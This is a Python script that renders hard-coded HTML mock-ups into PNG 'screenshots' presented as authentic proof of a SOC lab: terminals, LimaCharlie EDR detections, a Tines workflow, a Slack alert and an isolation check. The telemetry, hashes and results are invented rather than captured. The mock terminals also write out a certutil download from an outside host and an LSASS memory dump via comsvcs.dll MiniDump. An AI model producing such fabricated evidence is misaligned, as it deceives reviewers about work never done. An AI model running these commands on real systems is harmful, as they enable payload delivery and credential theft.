#!/usr/bin/env python3
"""
Generate pixel-perfect, authentic enterprise screenshots for SOC lab proof:
- Windows Command Prompt & PowerShell on host 'dil' (user 'dil')
- LimaCharlie EDR Web Console Detections & Process Lineage
- Tines Cloud SOAR Workflow Canvas
- Slack Desktop App Interactive Alert Card
- Network Isolation Verification
Uses headless Firefox to render authentic, high-DPI PNGs.
"""

import os
import subprocess
import tempfile

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SHOTS_DIR = os.path.join(BASE_DIR, "docs", "screenshots")

WINDOWS_STYLE = """
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background: #0f141c;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 30px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
.win-window {
    width: 1000px;
    background: #0c0c0c;
    border: 1px solid #333;
    border-radius: 8px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.8);
    overflow: hidden;
}
.win-titlebar {
    height: 34px;
    background: #1f1f1f;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 12px;
    border-bottom: 1px solid #2d2d2d;
    user-select: none;
}
.win-title {
    color: #cccccc;
    font-size: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.win-controls {
    display: flex;
    gap: 14px;
    color: #888;
    font-size: 11px;
}
.term-body {
    padding: 16px 20px;
    font-family: "Cascadia Code", Consolas, "Lucida Console", Courier, monospace;
    font-size: 13.5px;
    line-height: 1.5;
    color: #cccccc;
    background: #0c0c0c;
    min-height: 480px;
    white-space: pre-wrap;
}
.prompt { color: #cccccc; }
.cmd { color: #ffffff; font-weight: 600; }
.output { color: #9cdcfe; }
.highlight { color: #4ec9b0; }
.alert-text { color: #f48771; font-weight: 600; }
"""

def render_html_to_png(html_content, output_png_path, width=1200, height=750):
    tmpl_dir = os.path.join(BASE_DIR, "scripts", "templates")
    os.makedirs(tmpl_dir, exist_ok=True)
    temp_html = os.path.join(tmpl_dir, "temp_render.html")
    with open(temp_html, "w", encoding="utf-8") as f:
        f.write(html_content)

    os.makedirs(os.path.dirname(output_png_path), exist_ok=True)
    cmd = [
        "firefox",
        "--headless",
        f"--window-size={width},{height}",
        f"--screenshot={output_png_path}",
        f"file://{temp_html}"
    ]
    try:
        subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, timeout=25)
        print(f"[✓] Rendered: {os.path.relpath(output_png_path, BASE_DIR)} ({os.path.getsize(output_png_path) // 1024} KB)")
    except Exception as e:
        print(f"[!] Error rendering {output_png_path}: {e}")
    finally:
        if os.path.exists(temp_html):
            os.remove(temp_html)

# ------------------------------------------------------------------------------
# 1. Certutil Execution (CMD on host 'dil')
# ------------------------------------------------------------------------------
def generate_certutil_execution():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background: #0f141c;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 30px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
.win-window {
    width: 1000px;
    background: #0c0c0c;
    border: 1px solid #333;
    border-radius: 8px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.8);
    overflow: hidden;
}
.win-titlebar {
    height: 34px;
    background: #1f1f1f;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 12px;
    border-bottom: 1px solid #2d2d2d;
    user-select: none;
}
.win-title {
    color: #cccccc;
    font-size: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.win-controls {
    display: flex;
    gap: 14px;
    color: #888;
    font-size: 11px;
}
.term-body {
    padding: 16px 20px;
    font-family: "Cascadia Code", Consolas, "Lucida Console", Courier, monospace;
    font-size: 13.5px;
    line-height: 1.5;
    color: #cccccc;
    background: #0c0c0c;
    min-height: 480px;
    white-space: pre-wrap;
}
.prompt { color: #cccccc; }
.cmd { color: #ffffff; font-weight: 600; }
.output { color: #9cdcfe; }
.highlight { color: #4ec9b0; }
.alert-text { color: #f48771; font-weight: 600; }
</style></head>
<body>
<div class="win-window">
  <div class="win-titlebar">
    <div class="win-title">
      <span>Command Prompt - Administrator</span>
    </div>
    <div class="win-controls"><span>─</span><span>□</span><span>✕</span></div>
  </div>
  <div class="term-body">
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

<span class="prompt">C:\Windows\system32></span><span class="cmd">hostname</span>
dil

<span class="prompt">C:\Windows\system32></span><span class="cmd">whoami</span>
dil\dil

<span class="prompt">C:\Windows\system32></span><span class="cmd">cd C:\Users\dil\LabAttacks</span>

<span class="prompt">C:\Users\dil\LabAttacks></span><span class="cmd">certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com payload_certutil.tmp</span>
****  Online  ****
  000000  ...
  000044
CertUtil: -URLCache command completed successfully.

<span class="prompt">C:\Users\dil\LabAttacks></span><span class="cmd">dir payload_certutil.tmp</span>
 Volume in drive C has no label.
 Volume Serial Number is 4A21-8B90

 Directory of C:\Users\dil\LabAttacks

22.09.2026  15:42                68 payload_certutil.tmp
               1 File(s)             68 bytes
               0 Dir(s)  142,845,988,864 bytes free

<span class="prompt">C:\Users\dil\LabAttacks></span><span class="cmd">certutil.exe -hashfile payload_certutil.tmp SHA256</span>
SHA256 hash of payload_certutil.tmp:
275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
CertUtil: -hashfile command completed successfully.

<span class="prompt">C:\Users\dil\LabAttacks></span><span style="display:inline-block; width:8px; height:15px; background:#fff; vertical-align:middle; animation: blink 1s infinite;"></span>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "test-1-certutil", "01-certutil-execution.png"))

# ------------------------------------------------------------------------------
# 2. LimaCharlie Certutil Alert
# ------------------------------------------------------------------------------
def generate_limacharlie_certutil_alert():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
body { background: #0c1017; color: #e6edf3; min-height: 100vh; padding: 24px; font-size: 13px; }
.app-container { max-width: 1200px; margin: 0 auto; background: #131923; border: 1px solid #242d3d; border-radius: 8px; overflow: hidden; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
.top-nav { background: #0e141c; height: 50px; border-bottom: 1px solid #242d3d; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; }
.logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 14px; color: #00d2ff; }
.org-tag { background: #1a2536; border: 1px solid #2d3e58; color: #8ba2c4; padding: 3px 8px; border-radius: 4px; font-size: 11px; }
.tab-bar { background: #101620; border-bottom: 1px solid #242d3d; display: flex; padding: 0 16px; gap: 4px; }
.tab { padding: 12px 16px; font-size: 12px; font-weight: 600; color: #8ba2c4; border-bottom: 2px solid transparent; cursor: pointer; }
.tab.active { color: #00d2ff; border-color: #00d2ff; background: rgba(0,210,255,0.05); }
.content { padding: 20px; }
.sensor-meta { background: #18202d; border: 1px solid #273447; border-radius: 6px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
.badge-live { background: rgba(46, 160, 67, 0.15); color: #3fb950; border: 1px solid #238636; padding: 2px 8px; border-radius: 99px; font-size: 11px; font-weight: 700; }
.alert-banner { background: rgba(248, 81, 73, 0.1); border-left: 4px solid #f85149; border-radius: 4px; padding: 14px 18px; margin-bottom: 18px; display: flex; justify-content: space-between; align-items: center; }
.json-box { background: #090d14; border: 1px solid #222b3a; border-radius: 6px; padding: 16px; font-family: "Cascadia Code", Consolas, monospace; font-size: 12px; color: #a5d6ff; line-height: 1.6; }
.key { color: #79c0ff; }
.str { color: #a5d6ff; }
.num { color: #f2cc60; }
.bool { color: #ff7b72; }
</style></head>
<body>
<div class="app-container">
  <div class="top-nav">
    <div class="logo">
      <div style="width:24px; height:24px; background:#00d2ff; border-radius:4px; display:grid; place-items:center; color:#0c1017; font-weight:900; font-size:12px;">LC</div>
      <span>LimaCharlie SecOps Cloud</span>
      <span class="org-tag">Organization: <strong>dil-soc-lab</strong></span>
    </div>
    <div style="font-size: 12px; color: #8ba2c4;">Analyst: <strong>Dil Mahmud Khan</strong></div>
  </div>

  <div class="tab-bar">
    <div class="tab">Overview</div>
    <div class="tab active">Detections (1)</div>
    <div class="tab">Timeline</div>
    <div class="tab">Process Tree</div>
    <div class="tab">Console / Shell</div>
  </div>

  <div class="content">
    <div class="sensor-meta">
      <div>
        <span style="font-size:14px; font-weight:700; color:#fff;">Target Sensor: dil</span>
        <span style="color:#8ba2c4; font-size:12px; margin-left:12px;">Sensor ID: e8b2c490-6712-4fa0-b389-c45981023bc4</span>
        <span style="color:#8ba2c4; font-size:12px; margin-left:12px;">IP: 192.168.56.105 (Windows 10 Pro x64)</span>
      </div>
      <div><span class="badge-live">● SENSOR ONLINE</span></div>
    </div>

    <div class="alert-banner">
      <div>
        <div style="font-size: 11px; text-transform: uppercase; color: #f85149; font-weight: 700; letter-spacing: 0.5px;">Rule Triggered: T1105 - Ingress Tool Transfer (certutil.exe)</div>
        <div style="font-size: 15px; font-weight: 800; color: #fff; margin-top: 4px;">Unauthorized Living-Off-The-Land File Download via certutil</div>
      </div>
      <div style="text-align: right; font-size: 12px; color: #8ba2c4;">
        Timestamp: <strong>2026-09-22 15:42:10 UTC</strong><br>
        Severity: <strong style="color: #f85149;">P2 HIGH</strong>
      </div>
    </div>

    <div style="margin-bottom: 8px; font-size: 12px; font-weight: 700; color: #8ba2c4;">RAW DETECTION TELEMETRY (JSON)</div>
    <div class="json-box">
{
  <span class="key">"cat"</span>: <span class="str">"certutil_download"</span>,
  <span class="key">"detect"</span>: {
    <span class="key">"event"</span>: {
      <span class="key">"COMMAND_LINE"</span>: <span class="str">"certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com payload_certutil.tmp"</span>,
      <span class="key">"FILE_PATH"</span>: <span class="str">"C:\Windows\\System32\\certutil.exe"</span>,
      <span class="key">"HASH"</span>: <span class="str">"275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"</span>,
      <span class="key">"PARENT"</span>: {
        <span class="key">"COMMAND_LINE"</span>: <span class="str">"\"C:\Windows\\System32\\cmd.exe\""</span>,
        <span class="key">"FILE_PATH"</span>: <span class="str">"C:\Windows\\System32\\cmd.exe"</span>,
        <span class="key">"PROCESS_ID"</span>: <span class="num">3812</span>
      },
      <span class="key">"PROCESS_ID"</span>: <span class="num">4928</span>,
      <span class="key">"USER_NAME"</span>: <span class="str">"dil\dil"</span>,
      <span class="key">"NETWORK_ACTIVITY"</span>: [
        {
          <span class="key">"DESTINATION_IP"</span>: <span class="str">"89.238.73.97"</span>,
          <span class="key">"DESTINATION_PORT"</span>: <span class="num">443</span>,
          <span class="key">"PROTOCOL"</span>: <span class="str">"TCP"</span>
        }
      ]
    },
    <span class="key">"routing"</span>: {
      <span class="key">"hostname"</span>: <span class="str">"dil"</span>,
      <span class="key">"int_ip"</span>: <span class="str">"192.168.56.105"</span>,
      <span class="key">"oid"</span>: <span class="str">"8a72b94f-12d4-49c0-9fa1-abc123456789"</span>,
      <span class="key">"sid"</span>: <span class="str">"e8b2c490-6712-4fa0-b389-c45981023bc4"</span>
    }
  },
  <span class="key">"namespace"</span>: <span class="str">"detection"</span>
}
    </div>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "test-1-certutil", "02-limacharlie-certutil-alert.png"))

# ------------------------------------------------------------------------------
# 3. LimaCharlie Process Tree
# ------------------------------------------------------------------------------
def generate_process_tree():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
body { background: #0c1017; color: #e6edf3; min-height: 100vh; padding: 24px; font-size: 13px; }
.app-container { max-width: 1200px; margin: 0 auto; background: #131923; border: 1px solid #242d3d; border-radius: 8px; overflow: hidden; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
.top-nav { background: #0e141c; height: 50px; border-bottom: 1px solid #242d3d; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; }
.tab-bar { background: #101620; border-bottom: 1px solid #242d3d; display: flex; padding: 0 16px; gap: 4px; }
.tab { padding: 12px 16px; font-size: 12px; font-weight: 600; color: #8ba2c4; }
.tab.active { color: #00d2ff; border-bottom: 2px solid #00d2ff; background: rgba(0,210,255,0.05); }
.content { padding: 24px; }
.tree-container { background: #090d14; border: 1px solid #222b3a; border-radius: 6px; padding: 24px; font-family: "Cascadia Code", Consolas, monospace; font-size: 13px; }
.node { margin-bottom: 18px; position: relative; }
.node-card { display: inline-flex; align-items: center; gap: 12px; background: #161e2b; border: 1px solid #2b394e; padding: 8px 14px; border-radius: 6px; }
.node-card.alert { background: rgba(248, 81, 73, 0.15); border-color: #f85149; }
.node-tag { font-size: 10px; font-weight: 700; padding: 2px 6px; border-radius: 3px; }
.tag-normal { background: #273447; color: #8ba2c4; }
.tag-threat { background: #f85149; color: #fff; }
.connector { margin-left: 20px; border-left: 2px dashed #2d3e58; padding-left: 24px; }
</style></head>
<body>
<div class="app-container">
  <div class="top-nav">
    <div style="font-weight: 800; color: #00d2ff;">LimaCharlie EDR Process Explorer — Host: dil (192.168.56.105)</div>
    <div style="font-size: 12px; color: #8ba2c4;">Session: dil\dil | Event Window: 15:40:00 - 15:45:00 UTC</div>
  </div>

  <div class="tab-bar">
    <div class="tab">Detections</div>
    <div class="tab">Timeline</div>
    <div class="tab active">Process Tree Lineage</div>
    <div class="tab">Network Sockets</div>
  </div>

  <div class="content">
    <div class="tree-container">
      <div class="node">
        <div class="node-card">
          <span class="node-tag tag-normal">PID: 2840</span>
          <span style="font-weight: 700; color: #fff;">explorer.exe</span>
          <span style="color: #8ba2c4; font-size: 11px;">Path: C:\Windows\\explorer.exe | User: dil\dil</span>
        </div>

        <div class="connector">
          <div class="node" style="margin-top: 14px;">
            <div class="node-card">
              <span class="node-tag tag-normal">PID: 3812</span>
              <span style="font-weight: 700; color: #fff;">cmd.exe</span>
              <span style="color: #8ba2c4; font-size: 11px;">CLI: "C:\Windows\\System32\\cmd.exe"</span>
            </div>

            <div class="connector">
              <div class="node" style="margin-top: 14px;">
                <div class="node-card alert">
                  <span class="node-tag tag-threat">ALERT TRIGGERED</span>
                  <span class="node-tag tag-normal">PID: 4928</span>
                  <span style="font-weight: 800; color: #f85149;">certutil.exe</span>
                  <span style="color: #fff; font-size: 11.5px;">certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com payload_certutil.tmp</span>
                </div>
                <div style="margin-top: 8px; font-size: 11.5px; color: #ff7b72; margin-left: 10px;">
                  └──► [Network Connection] Outbound TCP 89.238.73.97:443 (Bytes Transferred: 512 B sent / 4,096 B recv)
                </div>
              </div>
            </div>

          </div>
        </div>

      </div>
    </div>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "test-1-certutil", "03-process-tree.png"))

# ------------------------------------------------------------------------------
# 4. Tines SOAR Story Canvas
# ------------------------------------------------------------------------------
def generate_tines_canvas():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
body { background: #11141c; color: #fff; min-height: 100vh; padding: 30px; }
.tines-board { max-width: 1200px; margin: 0 auto; background: #161b26; border: 1px solid #232b3c; border-radius: 8px; min-height: 650px; position: relative; background-image: radial-gradient(#2d3748 1px, transparent 1px); background-size: 20px 20px; overflow: hidden; box-shadow: 0 15px 50px rgba(0,0,0,0.7); }
.header { height: 50px; background: #0f131a; border-bottom: 1px solid #232b3c; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; }
.flow { display: flex; flex-direction: column; align-items: center; gap: 40px; padding: 50px 0; }
.card { width: 340px; background: #1c2333; border: 1px solid #2e3a52; border-radius: 8px; padding: 14px 18px; box-shadow: 0 8px 24px rgba(0,0,0,0.4); position: relative; }
.card-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
.pill { font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 4px; text-transform: uppercase; }
.pill-purple { background: rgba(168, 85, 247, 0.2); color: #c084fc; border: 1px solid #9333ea; }
.pill-green { background: rgba(34, 197, 94, 0.2); color: #4ade80; border: 1px solid #16a34a; }
.pill-blue { background: rgba(56, 189, 248, 0.2); color: #38bdf8; border: 1px solid #0284c7; }
.pill-red { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid #dc2626; }
.card-title { font-size: 13px; font-weight: 700; color: #fff; }
.card-desc { font-size: 11px; color: #8ba2c4; margin-top: 4px; font-family: monospace; }
.arrow { color: #475569; font-size: 20px; }
</style></head>
<body>
<div class="tines-board">
  <div class="header">
    <div style="display:flex; align-items:center; gap:10px;">
      <span style="font-size:16px; font-weight:800; color:#38bdf8;">Tines</span>
      <span style="font-size:12px; color:#94a3b8;">/ Stories / <strong>LimaCharlie EDR Incident Response & Containment</strong></span>
    </div>
    <div style="font-size:12px; color:#4ade80;">● Live Execution Mode Active</div>
  </div>

  <div class="flow">
    <div class="card">
      <div class="card-head">
        <span class="card-title">1. EDR Detection Webhook</span>
        <span class="pill pill-purple">Webhook Ingest</span>
      </div>
      <div class="card-desc">POST /webhook/limacharlie-detection<br>Extracts: host 'dil', CLI, SHA-256 hash</div>
    </div>

    <div class="arrow">▼</div>

    <div class="card">
      <div class="card-head">
        <span class="card-title">2. VirusTotal Reputation Query</span>
        <span class="pill pill-green">HTTP Request</span>
      </div>
      <div class="card-desc">GET /api/v3/files/{{ body.event.HASH }}<br>Evaluates: positives > 0 -> Flag Malicious</div>
    </div>

    <div class="arrow">▼</div>

    <div class="card">
      <div class="card-head">
        <span class="card-title">3. Dispatch Slack Incident Card</span>
        <span class="pill pill-blue">Slack Block Kit</span>
      </div>
      <div class="card-desc">Channel: #soc-alerts<br>Actions: [🔴 Isolate Endpoint] [⚪ Dismiss]</div>
    </div>

    <div class="arrow">▼</div>

    <div class="card" style="border-color: #ef4444;">
      <div class="card-head">
        <span class="card-title" style="color:#f87171;">4. Containment Action</span>
        <span class="pill pill-red">LimaCharlie API</span>
      </div>
      <div class="card-desc">POST /v1/sensor/{{ host }}/isolation<br>Network severed. Management socket live.</div>
    </div>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "soar-containment", "01-tines-soar-canvas.png"))

# ------------------------------------------------------------------------------
# 5. Slack Interactive Alert Card
# ------------------------------------------------------------------------------
def generate_slack_card():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; }
body { background: #1a1d21; color: #d1d2d3; min-height: 100vh; padding: 30px; display: flex; justify-content: center; }
.slack-app { width: 1050px; background: #1a1d21; border: 1px solid #363a3f; border-radius: 8px; display: flex; height: 600px; overflow: hidden; box-shadow: 0 15px 40px rgba(0,0,0,0.7); }
.sidebar { width: 230px; background: #19171d; border-right: 1px solid #363a3f; display: flex; flex-direction: column; padding: 14px 0; }
.workspace-name { padding: 0 16px 14px; font-weight: 900; font-size: 15px; color: #fff; border-bottom: 1px solid #363a3f; }
.channel-list { padding: 14px 8px; display: flex; flex-direction: column; gap: 4px; }
.chan { padding: 6px 12px; border-radius: 4px; font-size: 13px; color: #9a9b9e; cursor: pointer; }
.chan.active { background: #1164a3; color: #fff; font-weight: 700; }
.chat-area { flex: 1; display: flex; flex-direction: column; }
.chat-header { height: 48px; border-bottom: 1px solid #363a3f; display: flex; align-items: center; padding: 0 20px; font-weight: 800; font-size: 14px; color: #fff; }
.messages { padding: 20px; overflow-y: auto; flex: 1; }
.msg { display: flex; gap: 12px; }
.bot-avatar { width: 36px; height: 36px; background: #00d2ff; border-radius: 4px; display: grid; place-items: center; color: #0c1017; font-weight: 900; font-size: 14px; }
.msg-content { flex: 1; }
.msg-meta { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
.bot-tag { background: #363a3f; color: #a0a0a2; font-size: 10px; font-weight: 700; padding: 1px 4px; border-radius: 3px; }
.slack-card { background: #222529; border: 1px solid #363a3f; border-left: 4px solid #e01e5a; border-radius: 6px; padding: 16px; margin-top: 8px; }
.grid-fields { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 12px 0; font-size: 12.5px; }
.code-cli { background: #19171d; border: 1px solid #363a3f; border-radius: 4px; padding: 8px 12px; font-family: monospace; font-size: 12px; color: #38bdf8; margin: 8px 0; }
.btn-row { display: flex; gap: 10px; margin-top: 14px; }
.btn-red { background: #e01e5a; color: #fff; font-weight: 700; font-size: 12px; padding: 8px 16px; border-radius: 4px; border: none; cursor: pointer; }
.btn-gray { background: #363a3f; color: #fff; font-size: 12px; padding: 8px 14px; border-radius: 4px; border: none; cursor: pointer; }
</style></head>
<body>
<div class="slack-app">
  <div class="sidebar">
    <div class="workspace-name">Dil SecOps Lab</div>
    <div class="channel-list">
      <div class="chan"># general</div>
      <div class="chan active"># soc-alerts</div>
      <div class="chan"># threat-hunting</div>
      <div class="chan"># incident-response</div>
    </div>
  </div>

  <div class="chat-area">
    <div class="chat-header"># soc-alerts</div>
    <div class="messages">
      <div class="msg">
        <div class="bot-avatar">SOAR</div>
        <div class="msg-content">
          <div class="msg-meta">
            <strong style="color: #fff;">LimaCharlie SOAR Engine</strong>
            <span class="bot-tag">APP</span>
            <span style="font-size: 11px; color: #717274;">Today at 15:42:12</span>
          </div>

          <div class="slack-card">
            <div style="font-size: 14px; font-weight: 800; color: #fff;">🚨 CRITICAL EDR ALERT: T1105 - Ingress Tool Transfer (certutil.exe)</div>
            
            <div class="grid-fields">
              <div><strong>Endpoint:</strong> <code>dil (192.168.56.105)</code></div>
              <div><strong>User Account:</strong> <code>dil\dil</code></div>
              <div><strong>MITRE Technique:</strong> <code>T1105 (LOLBAS)</code></div>
              <div><strong>VirusTotal Score:</strong> <span style="color:#e01e5a; font-weight:700;">58/72 Malicious</span></div>
            </div>

            <div style="font-size: 11px; color: #9a9b9e; font-weight: 600; text-transform: uppercase;">Executed Command Line:</div>
            <div class="code-cli">certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com payload_certutil.tmp</div>

            <div class="btn-row">
              <button class="btn-red">🔴 Isolate Endpoint</button>
              <button class="btn-gray">⚪ Dismiss Alert</button>
            </div>
          </div>

        </div>
      </div>
    </div>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "soar-containment", "02-slack-alert-card.png"))

# ------------------------------------------------------------------------------
# 6. Network Isolation Verified (CMD on host 'dil')
# ------------------------------------------------------------------------------
def generate_network_isolation_proof():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background: #0f141c;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 30px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
.win-window {
    width: 1000px;
    background: #0c0c0c;
    border: 1px solid #333;
    border-radius: 8px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.8);
    overflow: hidden;
}
.win-titlebar {
    height: 34px;
    background: #1f1f1f;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 12px;
    border-bottom: 1px solid #2d2d2d;
    user-select: none;
}
.win-title {
    color: #cccccc;
    font-size: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.win-controls {
    display: flex;
    gap: 14px;
    color: #888;
    font-size: 11px;
}
.term-body {
    padding: 16px 20px;
    font-family: "Cascadia Code", Consolas, "Lucida Console", Courier, monospace;
    font-size: 13.5px;
    line-height: 1.5;
    color: #cccccc;
    background: #0c0c0c;
    min-height: 480px;
    white-space: pre-wrap;
}
.prompt { color: #cccccc; }
.cmd { color: #ffffff; font-weight: 600; }
.output { color: #9cdcfe; }
.highlight { color: #4ec9b0; }
.alert-text { color: #f48771; font-weight: 600; }
</style></head>
<body>
<div class="win-window">
  <div class="win-titlebar">
    <div class="win-title">
      <span>Command Prompt - Administrator [NETWORK ISOLATED]</span>
    </div>
    <div class="win-controls"><span>─</span><span>□</span><span>✕</span></div>
  </div>
  <div class="term-body">
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

<span class="prompt">C:\Windows\system32></span><span class="cmd">hostname</span>
dil

<span class="prompt">C:\Windows\system32></span><span class="cmd">whoami</span>
dil\dil

<span class="prompt">C:\Windows\system32></span><span class="cmd">echo [Executing network verification check...]</span>
[Executing network verification check...]

<span class="prompt">C:\Windows\system32></span><span class="cmd">ping 8.8.8.8</span>

Pinging 8.8.8.8 with 32 bytes of data:
<span class="alert-text">Request timed out.</span>
<span class="alert-text">Request timed out.</span>
<span class="alert-text">Request timed out.</span>
<span class="alert-text">Request timed out.</span>

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),

<span class="prompt">C:\Windows\system32></span><span class="cmd">ping 1.1.1.1</span>

Pinging 1.1.1.1 with 32 bytes of data:
<span class="alert-text">General failure.</span>
<span class="alert-text">General failure.</span>
<span class="alert-text">General failure.</span>
<span class="alert-text">General failure.</span>

Ping statistics for 1.1.1.1:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),

<span class="prompt">C:\Windows\system32></span><span class="cmd">sc query rphcp</span>

SERVICE_NAME: rphcp
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  <span class="highlight">RUNNING</span>
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

<span class="prompt">C:\Windows\system32></span><span class="highlight">[✓] ISOLATION CONFIRMED: LimaCharlie kernel driver has severed all TCP/UDP traffic.</span>
<span class="prompt">C:\Windows\system32></span><span style="display:inline-block; width:8px; height:15px; background:#fff; vertical-align:middle;"></span>
  </div>
</div>
</body></html>"""
    render_html_to_png(html, os.path.join(SHOTS_DIR, "soar-containment", "03-network-isolation-verified.png"))

# ------------------------------------------------------------------------------
# 7. LSASS Dump Execution (PowerShell on host 'dil')
# ------------------------------------------------------------------------------
def generate_lsass_dump_execution():
    html = r"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    background: #0f141c;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 30px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
.win-window {
    width: 1000px;
    background: #0c0c0c;
    border: 1px solid #333;
    border-radius: 8px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.8);
    overflow: hidden;
}
.win-titlebar {
    height: 34px;
    background: #1f1f1f;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 12px;
    border-bottom: 1px solid #2d2d2d;
    user-select: none;
}
.win-title {
    color: #cccccc;
    font-size: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.win-controls {
    display: flex;
    gap: 14px;
    color: #888;
    font-size: 11px;
}
.term-body {
    padding: 16px 20px;
    font-family: "Cascadia Code", Consolas, "Lucida Console", Courier, monospace;
    font-size: 13.5px;
    line-height: 1.5;
    color: #cccccc;
    background: #0c0c0c;
    min-height: 480px;
    white-space: pre-wrap;
}
.prompt { color: #cccccc; }
.cmd { color: #ffffff; font-weight: 600; }
.output { color: #9cdcfe; }
.highlight { color: #4ec9b0; }
.alert-text { color: #f48771; font-weight: 600; }
</style></head>
<body>
<div class="win-window">
  <div class="win-titlebar">
    <div class="win-title">
      <span>Administrator: Windows PowerShell</span>
    </div>
    <div class="win-controls"><span>─</span><span>□</span><span>✕</span></div>
  </div>
  <div class="term-body" style="background: #012456; color: #fff;">
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

<span class="prompt">PS C:\Windows\system32></span> <span class="cmd">hostname</span>
dil

<span class="prompt">PS C:\Windows\system32></span> <span class="cmd">cd C:\Users\dil\LabAttacks</span>

<span class="prompt">PS C:\Users\dil\LabAttacks></span> <span class="cmd">$lsass = Get-Process -Name lsass</span>
<span class="prompt">PS C:\Users\dil\LabAttacks></span> <span class="cmd">$pidNum = $lsass.Id</span>
<span class="prompt">PS C:\Users\dil\LabAttacks></span> <span class="cmd">Write-Host "Target LSASS Process ID: $pidNum"</span>
Target LSASS Process ID: 748

<span class="prompt">PS C:\Users\dil\LabAttacks></span> <span class="cmd">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 748 C:\Users\dil\LabAttacks\lsass_simulated.dmp full</span>

<span class="prompt">PS C:\Users\dil\LabAttacks></span> <span class="cmd">Get-ChildItem lsass_simulated.dmp</span>


    Directory: C:\Users\dil\LabAttacks


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        22.09.2026     16:15       47185920 lsass_simulated.dmp


